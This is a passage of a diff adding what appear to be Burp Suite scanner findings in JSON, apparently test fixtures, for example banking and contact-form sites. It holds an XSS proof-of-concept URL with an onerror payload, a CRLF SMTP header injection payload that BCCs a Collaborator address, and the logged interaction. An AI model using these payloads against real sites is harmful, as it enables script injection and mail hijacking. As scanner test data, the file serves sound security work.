AgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgPC9zY3JpcHQ+CiAgICAgICAgICAgICAgICAgICAgICAgIDxocj4KICAgICAgICAgICAgICAgICAgICA8L3NlY3Rpb24+CiAgICAgICAgICAgICAgICAgICAgPHNlY3Rpb24gY2xhc3M9InNlYXJjaCI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxmb3JtIGFjdGlvbj0iLyIgbWV0aG9kPSJHRVQiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IG1heGxlbmd0aD0iNjAwIiB0eXBlPSJ0ZXh0IiBwbGFjZWhvbGRlcj0iU2VhcmNoIHRoZSBibG9nLi4uIiBuYW1lPSJzZWFyY2giIHZhbHVlPSJmb28iPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidXR0b24iPlNlYXJjaDwvYnV0dG9uPgogICAgICAgICAgICAgICAgICAgICAgICA8L2Zvcm0+CiAgICAgICAgICAgICAgICAgICAgPC9zZWN0aW9uPgogICAgICAgICAgICAgICAgICAgIDxzZWN0aW9uIGNsYXNzPSJibG9nLWxpc3QiPgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJpcy1saW5rYmFjayI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSIvIj5CYWNrIHRvIEJsb2c8L2E+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvc2VjdGlvbj4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8L3NlY3Rpb24+CiAgICAgICAgPC9kaXY+CiAgICA8L2JvZHk+CjwvaHRtbD4K",
+                "length": 3147
+              }
+            ],
+            "was_redirect_followed": false,
+            "request_time": "1561027136620"
+          }
+        },
+        "source_stack_trace": "at Object.PCMZI (<anonymous>:1:408998)\nat Object.CjBYq (<anonymous>:1:912191)\nat Object.get search [as search] (<anonymous>:1:917893)\nat https://insecure-bank.com/?search=foo:42:78",
+        "sink_stack_trace": "at HTMLSpanElement.set [as innerHTML] (<anonymous>:1:1076252)\nat doSearchQuery (https://insecure-bank.com/?search=foo:40:84)\nat https://insecure-bank.com/?search=foo:44:33",
+        "event_listener_stack_trace": "",
+        "source_value": "?search=inogrwppdz%27%22`'\"/inogrwppdz/><inogrwppdz/\\>xh8jtt9ag1&foo",
+        "sink_value": "inogrwppdz'\"`'\"/inogrwppdz/><inogrwppdz/\\>xh8jtt9ag1",
+        "poc": "https://insecure-bank.com/?search='\"><img src=1 onerror=alert(1)>foo",
+        "origin": "",
+        "origin_checked": false,
+        "event_handler_data": "",
+        "event_handler_data_type": "",
+        "event_handler_modified_data": "",
+        "source_element_id": "",
+        "source_element_name": "",
+        "event_fired_event_name": "",
+        "event_fired_element_id": "",
+        "event_fired_element_name": "",
+        "event_fired_outer_html": ""
+      }
+    ],
+    "internal_data": "eyJmbGFncyI6MCwidmFyaWFudCI6MCwiaXNzdWVfZGV0YWlsc19tYXAiOnt9fQ=="
+  },
+  {
+    "name": "Serialized object in HTTP message",
+    "type_index": 4196608,
+    "serial_number": "4527994630450991104",
+    "origin": "http://insecure-bank.com",
+    "path": "/blog",
+    "severity": "high",
+    "confidence": "firm",
+    "description": "The parameter <b>foo<\/b> appears to contain a serialized <b>Java object<\/b>.",
+    "caption": "/passive/when_serialized_object_in_input_then_warn!/base64/url_html/java/warning",
+    "evidence": [
+      {
+        "type": "InformationListEvidence",
+        "request_response": {
+          "url": "http://insecure-bank.com/blog?input=foo",
+          "request": [
+            {
+              "type": "DataSegment",
+              "data": "R0VUIC9ibG9nP2lucHV0PWZvbyBIVFRQLzEuMQ0KSG9zdDogaW5zZWN1cmUtYmFuay5jb20NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwLjE0OyBydjo2Ny4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzY3LjANCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksKi8qO3E9MC44DQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNClJlZmVyZXI6IGh0dHA6Ly9pbnNlY3VyZS1iYW5rLmNvbS8/aW5wdXQ9Zm9vDQpDb25uZWN0aW9uOiBjbG9zZQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KDQo=",
+              "length": 386
+            }
+          ],
+          "response": [
+            {
+              "type": "DataSegment",
+              "data": "SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KU2VydmVyOiBBcGFjaGUvMi40LjkgKFVuaXgpDQpTdGF0dXM6IDIwMCBPSw0KVmFyeTogQWNjZXB0LUVuY29kaW5nDQpEYXRlOiBUaHUsIDIwIEp1biAyMDE5IDEyOjU3OjU1IEdNVA0KQ29udGVudC1MZW5ndGg6IDE0Ng0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPGh0bWw+PGEgaHJlZj0nP2FzZGY9eHl4JmZvbz0=",
+              "length": 218
+            },
+            {
+              "type": "HighlightSegment",
+              "data": "ck8wQUJYTnlBQkZxWVhaaExteGhibWN1U1c1MFpXZGxjaExpb0tUM2dZYzRBZ0FCU1FBRmRtRnNkV1Y0Y2dBUWFtRjJZUzVzWVc1bkxrNTFiV0psY29hc2xSMExsT0NMQWdBQWVIQUFBQUFI",
+              "length": 108
+            },
+            {
+              "type": "DataSegment",
+              "data": "Jz5hYWE8L2E+",
+              "length": 9
+            }
+          ],
+          "was_redirect_followed": false,
+          "request_time": "1561035511472"
+        },
+        "information_items": []
+      }
+    ],
+    "internal_data": "eyJmbGFncyI6MCwidmFyaWFudCI6MCwiaXNzdWVfZGV0YWlsc19tYXAiOnsiNDgiOiJmb28iLCI1MCI6IjIxOCIsIjMxIjoiZm9vIn19"
+  },
+  {
+    "name": "SMTP header injection",
+    "type_index": 2099200,
+    "serial_number": "2948193112275219456",
+    "origin": "http://insecure-website.com",
+    "path": "/contact-us",
+    "severity": "medium",
+    "confidence": "certain",
+    "description": "The <b>from<\/b> parameter appears to be vulnerable to SMTP header injection attacks. It is possible to inject email headers, with the result that an email generated by the application is copied to an arbitrary email address.<br><br>The payload <b>&gt;[0x0d][0x0a]BCC:gxhhuhyoeh6urrfjkxme1jpzqqwjkj8b2zumka9@burpcollaborator.net[0x0d][0x0a]jvi: j<\/b> was submitted in the from parameter.<br><br>The application made an SMTP connection to the Burp Collaborator server.",
+    "caption": "/smtp/from-vulnerable-with-greaterthan.php [from parameter]",
+    "evidence": [
+      {
+        "type": "CollaboratorEvidence",
+        "detail": {
+          "payload": {
+            "bytes": "Pg0KQkNDOmd4aGh1aHlvZWg2dXJyZmpreG1lMWpwenFxd2prajhiMnp1bWthOUBidXJwY29sbGFib3JhdG9yLm5ldA0KanZpOiBq",
+            "flags": 0
+          },
+          "band_flags": [
+            "out_of_band"
+          ]
+        },
+        "request_response": {
+          "url": "http://insecure-website.com/contact-us",
+          "request": [
+            {
+              "type": "DataSegment",
+              "data": "UE9TVCAvY29udGFjdC11cyBIVFRQLzEuMQ0KSG9zdDogaW5zZWN1cmUtd2Vic2l0ZS5jb20NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwLjE0OyBydjo2Ny4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzY3LjANCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksKi8qO3E9MC44DQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNClJlZmVyZXI6IGh0dHA6Ly9pbnNlY3VyZS13ZWJzaXRlLmNvbS9jb250YWN0LXVzDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDQwDQpDb25uZWN0aW9uOiBjbG9zZQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KDQpmcm9tPXRlc3RAdGVzdC5jb20=",
+              "length": 476
+            },
+            {
+              "type": "HighlightSegment",
+              "data": "JTNlJTBkJTBhQkNDJTNhZ3hoaHVoeW9laDZ1cnJmamt4bWUxanB6cXF3amtqOGIyenVta2E5QGJ1cnBjb2xsYWJvcmF0b3IubmV0JTBkJTBhanZpJTNhJTIwag==",
+              "length": 91
+            },
+            {
+              "type": "DataSegment",
+              "data": "JnN1YmplY3Q9dGVzdCZzZW5kPTE=",
+              "length": 20
+            }
+          ],
+          "response": [
+            {
+              "type": "DataSegment",
+              "data": "SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBUaHUsIDIwIEp1biAyMDE5IDEyOjM5OjIxIEdNVA0KU2VydmVyOiBBcGFjaGUvMi40LjcgKFVidW50dSkNClgtUG93ZXJlZC1CeTogUEhQLzUuNS45LTF1YnVudHU0LjIwDQpWYXJ5OiBBY2NlcHQtRW5jb2RpbmcNCkNvbnRlbnQtTGVuZ3RoOiAzNjYNCkNvbm5lY3Rpb246IGNsb3NlDQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KDQo8IWRvY3R5cGUgSFRNTD4KPGh0bWw+CjxoZWFkPgo8bWV0YSBjaGFyc2V0PSJVVEYtOCIgLz4KPHRpdGxlPlBIUCBNYWlsIGxhYjwvdGl0bGU+CjxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9ImJvb3RzdHJhcC5taW4uY3NzIiAvPgo8L2hlYWQ+Cjxib2R5Pgo8ZGl2IGNsYXNzPSJjb250YWluZXIiPgoJPGRpdiBjbGFzcw==",
+              "length": 412
+            },
+            {
+              "type": "DataSegment",
+              "data": "PSJwYWdlLWhlYWRlciI+CgkgICAgPGgyPlBIUCBNYWlsPC9oMj4KCSAgICA8cD5FeGFtcGxlIHNtdHAgbGFiPC9wPgoJPC9kaXY+CgkKCQkJPHAgY2xhc3M9ImFsZXJ0IGFsZXJ0LXN1Y2Nlc3MiPlN1Y2Nlc3NmdWxseSBzZW50IG1lc3NhZ2UuPC9wPgk8L2Rpdj4JCjwvYm9keT4KPC9odG1sPg==",
+              "length": 166
+            }
+          ],
+          "was_redirect_followed": false,
+          "request_time": "1561034397955"
+        },
+        "smtp_event": {
+          "protocol": "SMTP",
+          "sender": "www-data@insecure-website.com",
+          "recipients": [
+            "gxhhuhyoeh6urrfjkxme1jpzqqwjkj8b2zumka9@burpcollaborator.net"
+          ],
+          "message": "Received: from insecure-website.com (localhost [127.0.0.1])\r\n\tby insecure-website.com (8.14.4/8.14.4/Debian-4.1ubuntu1) with ESMTP id x5KCdLpw016311;\r\n\tThu, 20 Jun 2019 13:39:21 +0100\r\nReceived: (from www-data@localhost)\r\n\tby insecure-website.com (8.14.4/8.14.4/Submit) id x5KCdLpr016310;\r\n\tThu, 20 Jun 2019 13:39:21 +0100\r\nDate: Thu, 20 Jun 2019 13:39:21 +0100\r\nMessage-Id: <201906201239.x5KCdLpr016310@insecure-website.com>\r\nTo: root@insecure-website.com\r\nSubject: test\r\nX-PHP-Originating-Script: 1001:script.php\r\nMIME-Version: 1.0\r\nContent-type: text/plain; charset=iso-8859-1\r\nFrom: Root <test@test.com>\r\njvi: j>\r\n\r\nSome message\r\n",
+          "conversation": "220 burpcollaborator.net Burp Collaborator Server ready\r\nEHLO insecure-website.com\r\n250-Hello\r\n250 STARTTLS\r\nSTARTTLS\r\n220 Ready to start TLS\r\nEHLO insecure-website.com\r\n250 Hello\r\nMAIL From:<www-data@insecure-website.com>\r\n250 OK\r\nRCPT To:<gxhhuhyoeh6urrfjkxme1jpzqqwjkj8b2zumka9@burpcollaborator.net>\r\n250 OK\r\nDATA\r\n354 Send data\r\nReceived: from insecure-website.com (localhost [127.0.0.1])\r\n\tby insecure-website.com (8.14.4/8.14.4/Debian-4.1ubuntu1) with ESMTP id x5KCdLpw016311;\r\n\tThu, 20 Jun 2019 13:39:21 +0100\r\nReceived: (from www-data@localhost)\r\n\tby insecure-website.com (8.14.4/8.14.4/Submit) id x5KCdLpr016310;\r\n\tThu, 20 Jun 2019 13:39:21 +0100\r\nDate: Thu, 20 Jun 2019 13:39:21 +0100\r\nMessage-Id: <201906201239.x5KCdLpr016310@insecure-website.com>\r\nTo: root@insecure-website.com\r\nSubject: test\r\nX-PHP-Originating-Script: 1001:script.php\r\nMIME-Version: 1.0\r\nContent-type: text/plain; charset=iso-8859-1\r\nFrom: Root <test@test.com>\r\njvi: j>\r\n\r\nSome message\r\n.\r\n250 OK\r\nQUIT\r\n221 OK\r\n",
+          "time_stamp": "2019-Jun-20 12:39:57 UTC",
+          "time_between_sending_payload_and_receiving_interaction": "0",
+          "source_ip_address": "81.139.39.146",
+          "source_port": 53,
+          "type": "smtp",
+          "interaction_id": "gxhhuhyoeh6urrfjkxme1jpzqqwjkj8b2zumka9",
+          "description": "The Collaborator server received an SMTP connection from IP address 81.139.39.146 at 2019-Jun-20 12:39:57 UTC.<br><br>The email details were:<br><br>From:<div class=\"code\">www-data@insecure-website.com<\/div><br>To:<div class=\"code\">gxhhuhyoeh6urrfjkxme1jpzqqwjkj8b2zumka9@burpcollaborator.net<br><\/div><br>Message:<div class=\"code\">Received: from insecure-website.com (localhost [127.0.0.1])<br> &nbsp;&nbsp;&nbsp;by insecure-website.com (8.14.4/8.14.4/Debian-4.1ubuntu1) with ESMTP id x5KCdLpw016311;<br> &nbsp;&nbsp;&nbsp;Thu, 20 Jun 2019 13:39:21 +0100<br>Received: (from www-data@localhost)<br> &nbsp;&nbsp;&nbsp;by insecure-website.com (8.14.4/8.14.4/Submit) id x5KCdLpr016310;<br> &nbsp;&nbsp;&nbsp;Thu, 20 Jun 2019 13:39:21 +0100<br>Date: Thu, 20 Jun 2019 13:39:21 +0100<br>Message-Id: &lt;201906201239.x5KCdLpr016310@insecure-website.com&gt;<br>To: root@insecure-website.com<br>Subject: test<br>X-PHP-Originating-Script: 1001:script.php<br>MIME-Version: 1.0<br>Content-type: text/plain; charset=iso-8859-1<br>From: Root &lt;test@test.com&gt;<br>jvi: j&gt;<br><br>Some message<br><\/div>"
+        }
+      }
+    ],
+    "internal_data": "eyJmbGFncyI6MCwidmFyaWFudCI6MCwiaW5zZXJ0aW9uX3BvaW50X2tleSI6IjJ4MCIsImluc2VydGlvbl9wb2ludF9pZGVudGlmaWVycyI6W3sidHlwZV9pbmRleCI6NDA5NywibmFtZSI6ImZyb20ifV0sImlzc3VlX2RldGFpbHNfbWFwIjp7fX0="
+  },
+  {
+    "name": "Suspicious input transformation (reflected)",
+    "type_index": 4197632,
+    "serial_number": "3578185335313644544",
+    "origin": "http://insecure-bank.com",
+    "path": "/url-shorten",
+    "severity": "info",
+    "confidence": "firm",
+    "description": "The application appears to process the value of the <b>input<\/b> request parameter, transform overlong UTF-8 sequences in an unexpected way, and echo the result in the response.<br><br>The payload <strong>guqont6rks[0xc1][0x81]n44qpkckyf<\/strong> was submitted in the input parameter. This payload contains the overlong UTF-8 sequence [0xc1][0x81] corresponding to the character 'A'. The input was copied into the application's response as <strong>guqont6rksBn44qpkckyf<\/strong>. This indicates that the application transformed the sequence in some unexpected way.<br><br>It might be possible to use this behavior to cause the application to differently interpret characters from the start of any data that is concatenated onto the input, by finishing the payload with the start of the multi-character sequence.",
+    "caption": "/suspicious_input_transformation/reflected/character_consumption/overlong_utf8_decoding! [input parameter]",
+    "evidence": [
+      {
+        "type": "FirstOrderEvidence",
+        "detail": {
+          "payload": {
+            "bytes": "Z3Vxb250NnJrc8GBbjQ0cXBrY2t5Zg==",
+            "flags": 0
+          },
+          "band_flags": [
+            "in_band"
+          ]
+        },
+        "request_response": {
+          "url": "http://insecure-bank.com/url-shorten?input=guqont6rks%c1%81n44qpkckyf",
+          "request": [
+            {
+              "type": "DataSegment",
+              "data": "R0VUIC91cmwtc2hvcnRlbj9pbnB1dD0=",
+              "length": 23
+            },
+            {
+              "type": "HighlightSegment",
+              "data": "Z3Vxb250NnJrcyVjMSU4MW40NHFwa2NreWY=",
+              "length": 26
+            },
+            {
+              "type": "DataSegment",
+              "data": "IEhUVFAvMS4xDQpIb3N0OiBpbnNlY3VyZS1iYW5rLmNvbQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTAuMTQ7IHJ2OjY3LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvNjcuMA0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSwqLyo7cT0wLjgNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KUmVmZXJlcjogaHR0cDovL2luc2VjdXJlLWJhbmsuY29tL3VybC1zaG9ydGVuDQpDb25uZWN0aW9uOiBjbG9zZQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KDQo=",
+              "length": 368
+            }
+          ],
+          "response": [
+            {
+              "type": "DataSegment",
+              "data": "SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LVR5cGU6IHRleHQvY3NzO2NoYXJzZXQ9VVRGLTgNClNlcnZlcjogQXBhY2hlLzIuNC45IChVbml4KQ0KU3RhdHVzOiAyMDAgT0sNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KWC1GcmFtZS1PcHRpb25zOiBERU5ZDQpEYXRlOiBUaHUsIDIwIEp1biAyMDE5IDEwOjUyOjAwIEdNVA0KQ29udGVudC1MZW5ndGg6IDMyDQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo8ZGl2Pg==",
+              "length": 229
+            },
+            {
+              "type": "HighlightSegment",
+              "data": "Z3Vxb250NnJrc0JuNDRxcGtja3lm",
+              "length": 21
+            },
+            {
+              "type": "DataSegment",
+              "data": "PC9kaXY+",
+              "length": 6
+            }
+          ],
+          "was_redirect_followed": false,
+          "request_time": "82"
+        }
+      }
+    ],
+    "internal_data": "eyJmbGFncyI6MCwidmFyaWFudCI6MSwiaW5zZXJ0aW9uX3BvaW50X2tleSI6IjF4MCIsImluc2VydGlvbl9wb2ludF9pZGVudGlmaWVycyI6W3sidHlwZV9pbmRleCI6NDA5NiwibmFtZSI6ImlucHV0In1dLCJpc3N1ZV9kZXRhaWxzX21hcCI6eyIxMCI6Imd1cW9udDZya3NCbjQ0cXBrY2t5ZiJ9fQ=="
+  }
+]
